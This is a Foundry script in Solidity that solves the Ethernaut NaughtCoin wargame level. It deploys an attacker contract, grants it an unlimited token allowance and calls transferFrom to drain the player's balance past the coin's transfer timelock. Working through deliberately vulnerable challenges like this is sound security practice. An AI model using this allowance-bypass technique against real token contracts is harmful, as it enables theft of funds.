//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {NaughtCoin}  from "src/ethernaut15.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut15Script is Script{
    NaughtCoin instance = NaughtCoin(0x4343aF7982AC4667eA7BCA8A67CC599a18836e0a);
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker attacke = new attacker{value: 0.001 ether}();
        instance.approve(address(attacke),type(uint256).max);
        attacke.attack(instance);
        vm.stopBroadcast();
    }
}

contract attacker{
    constructor() payable{
    }
    function attack(NaughtCoin instance) public{
        instance.transferFrom(msg.sender,address(this),instance.balanceOf(msg.sender));
        console.log("balance of attacker",instance.balanceOf(address(this)));
    }
}


